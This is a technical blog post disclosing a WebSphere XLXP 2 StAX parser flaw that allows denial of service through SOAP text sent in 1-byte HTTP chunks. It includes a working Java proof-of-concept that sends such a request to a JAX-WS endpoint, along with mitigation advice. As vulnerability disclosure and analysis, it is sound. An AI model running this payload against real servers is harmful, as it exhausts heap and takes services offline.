---
layout: post
title: "Broken by design: WebSphere's default StAX implementation (part 1)"
category: tech
tags:
 - WebSphere
 - StAX
 - Exploit
 - Broken by design
blogger: /2013/10/broken-by-design-xlxp2.html
disqus: true
description: >
 This article exposes a design flaw in WebSphere's default StAX implementation (XLXP 2) that can be exploited to perform
 a denial-of-service attack.
---

Recently I came across an issue in WebSphere's default StAX implementation (XLXP 2) where the parser unexpectedly consumed a
huge amount of heap. The issue was triggered by a gzipped XML file containing a base64 encoded PDF document with several
megabytes of content. A test showed that although the size of the XML document was of order of 10 MB, XLXP 2 required almost
1 GB of heap to parse the document (without any additional processing). That is of course totally unexpected: for large
documents, an XML parser should never require an amount of heap 100 times as large as the size of the XML document.

After investigating the issue (with the XLXP 2 version in WAS 8.5.0.2), it turned out that the problem with IBM's parser is
caused by the combination of three things:

*   Irrespective of the value of the `javax.xml.stream.isCoalescing` property (`XMLInputFactory.IS_COALESCING`), the parser will
    always return a text node in the input document as a single `CHARACTERS` event (where the precise meaning of "text node" is
    a sequence of [`CharData`](http://www.w3.org/TR/REC-xml/#NT-CharData) and/or [`Reference`](http://www.w3.org/TR/REC-xml/#NT-Reference)
    tokens neither preceded nor followed by a `CharData` or `Reference` token).

    For readers who are not experts in the StAX specification, this requires some additional explanations. With respect to
    coalescing, the only requirement stipulated by StAX (which is notoriously underspecified) is that enabling coalescing mode
    "requires the processor to coalesce adjacent character data". There are two interpretations of this requirement:

    *   The first one is that this requirement is simply related to how [CDATA sections](http://www.w3.org/TR/REC-xml/#sec-cdata-sect)
        are processed. If coalescing is enabled, then CDATA sections nodes are implicitly converted to text nodes and merged with
        adjacent text nodes. In non coalescing mode, CDATA sections are reported as distinct events, such that there is one and only
        one event for each text node and CDATA section in the input document. This interpretation corresponds to the definition
        of coalescing used by DOM (see `DocumentBuilderFactory#setCoalescing()`).

    *   The second interpretation goes a step further and assumes that in non coalescing mode, the parser should handle text
        nodes in a way similar to SAX, i.e. split text nodes that are larger than parser's input buffer into chunks. In this
        case, a text node is reported as one or more CHARACTERS events. This allows the parser to process text nodes of
        arbitrary length with constant memory.

    BEA's original reference implementation and XLXP 2 are based on the first interpretation, while SJSXP (the StAX
    implementation in Oracle's JRE) and Woodstox use the second interpretation. Note that for applications using StAX, this
    doesn't really make any difference because an application using a StAX parser in non coalescing mode must be written
    such that it is able to correctly process any sequence of `CHARACTERS` and `CDATA` events.

*   XLXP 2 uses a separate buffer for each read operation on the underlying input stream, i.e. for each read operation, the
    parser will either allocate a new buffer or recycle a previously created buffer that is no longer in use. That is the case
    even if the previous read operation didn't fill the buffer completely: XLXP 2 will not attempt to read data into the buffer
    used during the previous read operation. By default, the size of each buffer is 64 KB.

*   When processing character data, the buffers containing the corresponding (encoded) data from the underlying stream remain
    in use (i.e. cannot be recycled) until the data has been reported back to the application. Note that this is a design
    choice: the parser could as well have been designed to accumulate the decoded character data in an intermediary buffer
    and immediately release the original buffers.

This has two consequences:

*   When processing a text node from the input document, all buffers containing chunks of data for that text node remain in use
    until the parser reaches the end of the text node.

*   If the read operations on the underlying input stream return less than the requested number of bytes (i.e. the buffer size),
    then these buffers will only be partially filled.

This means that processing a text node may require much more memory than one would expect based on the length of that text node.
Since the default buffer size is 64 KB, in the extreme case (where each read operation on the input stream returns a single byte),
the parser may need 65536 times more memory than the length of the text node. In the case I came across, the XML document
contained a text node of around 9 million characters and the input stream was a `GZIPInputStream` which returned more or less
600 bytes per read operation. A simple calculation shows that XLXP 2 will require of order of 900 MB of heap to process that text node.

IBM's reaction to this was that XLXP 2 is "working as designed" (!) and that the issue can be mitigated with the help of two
system properties:

`com.ibm.xml.xlxp2.api.util.encoding.DataSourceFactory.bufferLength`
:   Obviously, this system property specifies the size of the buffers described earlier. Setting it to a smaller value than the
    default 65536 bytes will reduce the amount of unused space. On the other hand, if the value is too small, then this will
    obviously have an impact on performance. Note that the fact that this parameter is specified as a system property is
    especially unfortunate, because it will affect all applications running on a given WebSphere instance.

`com.ibm.xml.xlxp2.api.util.Pool.STRONG_REFERENCE_POOL_MAXIMUM_SIZE`
:   This property was introduced by APAR [PM42465](http://www-01.ibm.com/support/docview.wss?uid=swg1PM42465) and is related to
    pooling of `XMLStreamReader` objects, not buffers. Therefore it has no impact on the problem described here.

However, it should be clear by now that adjusting these system property doesn't eliminate the problem completely, unless one uses
an unreasonable small buffer size. This raises another interesting question: considering that WebSphere's JAX-WS implementation
relies on StAX and that XLXP 2 may under certain circumstances allocate an amount of heap that is several order of magnitudes
larger than the message size, isn't that a vector for a denial-of-service attack? If it's possible to construct a request that
tricks XLXP 2 into reading multiple small chunks from the incoming SOAP message, couldn't this be used to trigger an OOM error
on the target application server?

It turns out that unfortunately this is indeed possible. The attack takes advantage of the fact that when WebSphere receives a
POST request that uses the chunked transfer encoding, the Web container will deliver each chunk separately to the application.
If the request is dispatched to a JAX-WS endpoint this means that each chunk is delivered individually to the StAX parser, which
is exactly the attack vector we are looking for. To exploit this vulnerability, one simply has to construct a SOAP message with
a moderately large text node (let's say 10000 characters) and send that message to a JAX-WS endpoint using 1-byte chunks
(at least for the part containing the text node). To process that text node, XLXP 2 will have to allocate 10000 buffers, each
one 64 KB in size (assuming that the default configuration is used), which means that more than 600 MB of heap are required.

The following small Java program can be used to test if a particular (JAX-WS endpoint on a given) WebSphere instance is vulnerable:

~~~ java
public class XLXP2DoS {
  private static final String CHARSET = "utf-8";
  
  public static void main(String[] args) throws Exception {
    String host = "localhost";
    int port = 9080;
    String path = "/myapp/myendpoint";
    Socket socket = new Socket(host, port);
    OutputStream out = socket.getOutputStream();
    out.write(("POST " + path + " HTTP/1.1\r\n"
        + "Host: " + host + ":" + port + "\r\n"
        + "Content-Type: text/xml; charset=" + CHARSET + "\r\n"
        + "Transfer-Encoding: chunked\r\n"
        + "SOAP-Action: \"\"\r\n\r\n").getBytes("ascii"));
    writeChunk(out, "<s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'>"
        + "<s:Header><p:dummy xmlns:p='urn:dummy'>");
    for (int i=0; i<10000; i++) {
      writeChunk(out, "A");
    }
    writeChunk(out, "</p:dummy></s:Header><s:Body/></s:Envelope>");
    out.write("0\r\n\r\n".getBytes("ascii"));
    socket.close();
  }
  
  private static void writeChunk(OutputStream out, String data) throws IOException {
    out.write((Integer.toHexString(data.length()) + "\r\n").getBytes("ascii"));
    out.write(data.getBytes(CHARSET));
    out.write("\r\n".getBytes("ascii"));
  }
}
~~~

The vulnerability has some features that make it rather dangerous:

*   Since the amount of heap used is several order of magnitudes larger than the message size, it is generally possible to carry
    out this attack even against application servers with a maximum POST request size configured in the
    [HTTP transport channel settings][1].

[1]: http://pic.dhe.ibm.com/infocenter/wasinfo/v7r0/topic/com.ibm.websphere.express.doc/info/exp/ae/urun_chain_typehttp.html

*   An HTTP server in front of the application server doesn't protect against the attack. The reason is that the WebSphere plug-in
    forwards the chunks unmodified to the target server. The same will be true for most types of load balancers. For reverse
    proxies other than IBM HTTP Server this may or may not be true. On the other hand, a security gateway (such as DataPower) or
    an ESB will likely protect against this attack.

*   Since the request is relatively small, it will be difficult to distinguish from other requests and to trace back to its source.

One possible way to fix this vulnerability is to use another StAX implementation, as described in a
[previous post](/2013/10/02/broken-by-design-websphere-stax.html). In fact, switching the StAX implementation for a given Java EE
application also changes the StAX implementation used to process SOAP messages for JAX-WS endpoints exposed by that application.
Since WebSphere's JAX-WS implementation is based on Apache Axis2 and Apache Axiom, and the recommended StAX implementation for
Axiom is Woodstox, that particular StAX implementation may be the best choice. Note that this may still have some unexpected
side effects. In particular, XLXP 2 is known to implement some optimizations that are designed to work together with the JAXB 2
implementation in WebSphere. Obviously these optimizations will no longer work if XLXP 2 is replaced by Woodstox. It is also not
clear if using WebSphere's JAX-WS implementation with a non-IBM StAX implementation is supported by IBM, i.e. if you will get
help if there is an interoperability issue.

**Update:** IBM finally acknowledged that there is an issue with XLXP 2 (although they avoided qualifying it as a security issue).
See the [second part](/2013/12/09/broken-by-design-xlxp2-part2.html) of this article for a discussion about the "fix" IBM applied
to solve the issue.
